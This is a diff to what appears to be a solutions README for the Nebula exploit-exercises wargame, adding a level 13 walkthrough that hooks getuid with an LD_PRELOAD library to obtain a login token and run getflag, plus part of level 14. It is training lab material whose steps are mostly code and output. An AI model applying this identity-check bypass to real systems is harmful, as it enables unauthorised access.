@@ -4,6 +4,44 @@ nebula-exercises
 
 > [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)
 
+
+level 13
+--------
+
+##### overload getuid call to return 'FAKEUID'
+```c
+// fake_getuid.c
+#include <sys/types.h>
+
+uid_t getuid()
+{
+    return 1000;
+}
+```
+
+##### build lib and use LD_PRELOAD
+```bash
+level13@nebula:~$ gcc --shared -fPIC fake_getuid.c -o fake_getuid.so
+level13@nebula:~$ export LD_PRELOAD=/home/level13/fake_getuid.so
+```
+
+##### copy flag13 binary to level13 home to use LD_PRELOAD trick
+```bash
+# LD_PRELOAD needs reel uid == effective uid
+level13@nebula:~$ cp /home/flag13/flag13 /home/level13
+level13@nebula:~$ ./flag13 
+your token is b705702b-76a8-42b0-8844-3adabbe5ac58
+```
+
+##### use token as pwd for flag13 user and execute getflag
+```bash
+level13@nebula:~$ su - flag13
+Password: 
+flag13@nebula:~$ getflag 
+You have successfully executed getflag on a target account
+```
+
+
 level 14
 --------
 
@@ -32,6 +70,7 @@ for i, c in enumerate(token):
 print(reverse)
 # --> output: 8457c118-887c-4e40-a5a6-33a25353165
 ```
+
 ##### check reverse.py
 ```bash
 python reverse.py | /home/flag14/flag14 -e
